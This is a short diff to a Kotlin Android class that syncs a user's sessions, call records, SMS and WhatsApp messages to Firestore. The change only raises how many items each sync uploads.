@@ -58,7 +58,7 @@ class FirestoreSyncManager(private val context: Context) {
             val userRef = firestore.collection("users").document(uid)
 
             // Sync sessions
-            for (s in sessions.take(25)) {
+            for (s in sessions.take(50)) {
                 userRef.collection("sessions").document(s.id).set(
                     hashMapOf(
                         "id" to s.id,
@@ -75,7 +75,7 @@ class FirestoreSyncManager(private val context: Context) {
             }
 
             // Sync calls
-            for (c in calls.take(50)) {
+            for (c in calls.take(200)) {
                 userRef.collection("calls").document(c.id.toString()).set(
                     hashMapOf(
                         "id" to c.id,
@@ -91,7 +91,7 @@ class FirestoreSyncManager(private val context: Context) {
             }
 
             // Sync SMS
-            for (m in sms.take(50)) {
+            for (m in sms.take(200)) {
                 userRef.collection("sms").document(m.id.toString()).set(
                     hashMapOf(
                         "id" to m.id,
@@ -107,7 +107,7 @@ class FirestoreSyncManager(private val context: Context) {
             }
 
             // Sync WhatsApp
-            for (w in whatsapp.take(50)) {
+            for (w in whatsapp.take(200)) {
                 userRef.collection("whatsapp").document(w.id.toString()).set(
                     hashMapOf(
                         "id" to w.id,
